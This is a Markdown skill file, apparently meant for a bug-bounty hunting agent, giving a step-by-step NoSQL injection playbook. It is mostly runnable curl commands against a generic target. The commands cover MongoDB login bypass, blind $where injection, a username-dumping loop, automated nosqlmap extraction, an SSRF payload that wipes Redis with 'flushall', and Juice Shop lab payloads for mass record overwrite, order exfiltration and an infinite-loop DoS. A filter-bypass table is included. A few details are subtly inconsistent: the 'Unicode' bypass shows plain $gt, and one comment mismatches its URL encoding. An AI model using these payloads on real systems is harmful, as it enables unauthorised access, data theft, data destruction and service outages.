---
name: hunt-nosqli
description: "Hunt NoSQL Injection — MongoDB operator injection ($where, $regex, $gt, $ne), CouchDB, Redis command injection, auth bypass via NoSQLi, data dump. Use when target uses MongoDB/Mongoose, CouchDB, Redis, or shows NoSQL error messages."
sources: hackerone_public
report_count: 14
---

# HUNT-NOSQLI — NoSQL Injection

## Crown Jewel Targets

NoSQL injection is most valuable when it bypasses authentication (Critical) or leaks the entire user collection (High).

**Highest-value chains:**
- **MongoDB auth bypass** — `{"username": {"$gt": ""}, "password": {"$gt": ""}}` logs in as first user in collection (usually admin)
- **$where JS injection** — if $where is enabled: blind injection → data exfil
- **Redis command injection** — via SSRF or direct TCP, SLAVEOF attacker-ip → config write → webshell
- **Elasticsearch injection** — _search endpoint with Groovy script injection (pre-5.0) → RCE

---

## Attack Surface Signals

### URL & Param Patterns
```
/api/users/login         POST with JSON body
/api/search?q=
/api/find?filter=
/api/query?where=
Any endpoint accepting JSON body with username/password
```

### Stack Signals
| Signal | Vector |
|--------|--------|
| MongoDB error messages in response | Operator injection |
| mongoose / monk in JS bundles | ODM patterns |
| X-Powered-By: Express | Node.js + MongoDB common stack |
| CouchDB/_utils UI exposed | Futon/Fauxton admin |
| Redis port 6379 open (via SSRF) | CONFIG SET / SLAVEOF |
| Elasticsearch :9200 open | Script injection |

---

## Step-by-Step Hunting Methodology

### Phase 1 — Auth Bypass (MongoDB)
```bash
# Operator injection in JSON body
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Regex wildcard — match any username
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# ne (not equal) bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrong"}}'

# in array bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": "x"}}'
```

### Phase 2 — URL Parameter Injection
```bash
# Array notation (Express/PHP-style)
# NOTE: single-quote the operator portions so $gt/$regex/$options reach the server
# literally — inside double quotes the shell expands $gt etc. to empty strings.
curl "https://$TARGET/api/users?username[\$gt]=&password[\$gt]="
curl "https://$TARGET/api/search?q[\$regex]=.*&q[\$options]=i"

# POST form data
curl "https://$TARGET/api/login" \
  --data 'username[$gt]=&password[$gt]='
```

### Phase 3 — $where Blind Injection (time-based)
```bash
# Test if $where is enabled (time-based detection, 5s delay)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){var d=new Date();while(new Date()-d<5000){}; return true;}"}}'
# If response takes 5+ seconds → $where injection confirmed

# Blind data exfil (username starts with 'a'?)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"}}'
```

### Phase 4 — Data Dump via Regex
```bash
# Enumerate usernames character by character
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  RESP=$(curl -s -X POST https://$TARGET/api/users \
    -H "Content-Type: application/json" \
    -d "{\"username\": {\"\$regex\": \"^$c\"}}")
  echo "$c: $(echo $RESP | wc -c)"
done
```

### Phase 5 — Automation
```bash
# nosqlmap
pip3 install nosqlmap
nosqlmap -u "https://$TARGET/api/login" --attack 1

# nosqlmap data extraction
nosqlmap -u "https://$TARGET/api/login" --attack 2
```

### Phase 6 — Redis via SSRF
```bash
# If SSRF found, probe internal Redis via gopher://
curl "https://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"

# CONFIG SET webshell (if Redis has write access to web root)
# Use SLAVEOF for OOB data exfil
```

### Phase 7 — P1: Write-Path / Operator Injection (OWASP Juice Shop)

Auth bypass (Phase 1) only *reads*. The high-value MongoDB findings are **write-path operator
injection** (mutate documents you don't own) and **`$where` on a single-resource lookup** (turn a
one-record fetch into a full-collection scan or a DoS). OWASP Juice Shop's review subsystem stores
product reviews in **MongoDB** (the only Mongo-backed feature; the rest of the app is SQLite), and
exposes the update/find routes below. Base URL is `http://localhost:3000`. These three vectors map
directly to the *NoSQL Manipulation*, *NoSQL Exfiltration*, and *NoSQL DoS* challenges.

> Prereq: `PUT /rest/products/reviews` requires a logged-in JWT. Register/login, then export it:
> ```bash
> JWT=$(curl -s http://localhost:3000/rest/user/login \
>   -H 'Content-Type: application/json' \
>   -d '{"email":"jim@juice-sh.op","password":"ncc-1701"}' | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
> ```

**7a — Update-doc operator injection (`{$ne:-1}`) → mass-update every review → NoSQL Manipulation**

The handler passes the client-supplied `id` straight into the Mongo update **filter**. A scalar id
edits one review; swapping it for an operator object makes the filter match the whole collection, so
one `PUT` overwrites the `message` of *every* review — including reviews you never authored.

```bash
# Legit shape edits one review by its _id. The vuln: id is the filter, not a guarded owner check.
# {"$ne": -1} matches every document (no review _id equals -1) → mass overwrite.
curl -s -X PATCH http://localhost:3000/rest/products/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $JWT" \
  -d '{"id": {"$ne": -1}, "message": "pwned-by-nosqli"}'
# Confirm: every product's reviews now read "pwned-by-nosqli".
# (Juice Shop registers this route as PATCH; older builds also accept PUT — try both.)
```
Unlocks: **NoSQL Manipulation** ("Update multiple product reviews at the same time").

**7b — Single→all-resources `$where` on `GET /rest/track-order/:id` → NoSQL Exfiltration**

`track-order/:id` is meant to return *one* order by its id. The id is interpolated into a Mongo query
unsanitized, so injecting a `$where` JavaScript predicate that always returns true coerces the
single-document lookup into a **full `orders` collection scan** — exfiltrating every customer's order.
The `:id` is in the URL path, so the payload must be URL-encoded.

```bash
# Inject a $where that is always true: ... ' || 'true' || '   — returns ALL orders, not just :id.
# Decoded payload: %2522 → ", %20 → space.  Classic Juice Shop form:
curl -s "http://localhost:3000/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27"
# Equivalent explicit-operator form (Mongo evaluates the JS predicate per document):
curl -s "http://localhost:3000/rest/track-order/%7B%22%24where%22%3A%22true%22%7D"
# Success = response array contains orders belonging to other users (multiple orderId values).
```
Unlocks: **NoSQL Exfiltration** ("All your orders are belong to us" — retrieve all orders via the
track-order endpoint).

**7c — `$where`-sleep DoS framing on the same track-order route → NoSQL DoS**

Because `track-order/:id` evaluates an injected `$where` predicate as JavaScript **once per document**,
a tight busy-loop (no `sleep()` needed; Mongo's JS engine blocks the query thread) ties up the DB on
every document — a denial-of-service amplified by collection size.

```bash
# Decoded id payload:  ; while(true){}    → infinite loop in the $where JS, hangs the query.
# URL-encoded; cap client wait so YOU don't hang. A long/aborted server response confirms the DoS.
time curl -s --max-time 10 \
  "http://localhost:3000/rest/track-order/%3B%20while(true)%7B%7D"
# Confirmed if the request blocks until --max-time (server-side thread is spinning), vs a fast
# 200 for a benign id.
```
Unlocks: **NoSQL DoS** ("Let the server sleep for some time" — cause the server to hang via a
`$where`/`sleep`-style NoSQL payload on track-order).

> Why these are P1, not the Phase-1 read bypass: 7a *mutates* data you don't own (integrity), 7b
> *exfiltrates* the entire orders collection (confidentiality), 7c *denies service* (availability) —
> full CIA impact from one unsanitized id sink.

---

## Bypass Table

| Defense | Bypass |
|---------|--------|
| JSON.parse rejects objects | Use array: `password[$ne]=x` (URL params) |
| Sanitizes `$` | Unicode: `$gt` |
| Blocks operator keys | Nested objects deeper in structure |

---

## Chain Table

| NoSQLi finding | Chain to | Impact |
|---------------|----------|--------|
| Auth bypass | Admin panel access | Full admin control |
| User enum via regex | Credential stuffing | Mass ATO |
| $where enabled | Arbitrary JS in DB process | Data exfil or DoS |
| Redis via SSRF | CONFIG SET / SLAVEOF | Webshell or data exfil |
| Update-filter operator (`{$ne:-1}`) | Mass overwrite of others' records | Integrity loss (NoSQL Manipulation) |
| `$where` on single-resource GET | Full-collection scan / busy-loop | Exfil all orders + DoS (track-order) |

---

## Validation

✅ Auth bypass: logged in without valid credentials, received valid session token
✅ Data dump: returned users/documents you shouldn't have access to
✅ Blind injection: confirmed via time-delay (>4 seconds consistent)

**Severity:**
- Auth bypass as admin: Critical
- User collection dump: High
- Blind injection (no useful exfil): Medium

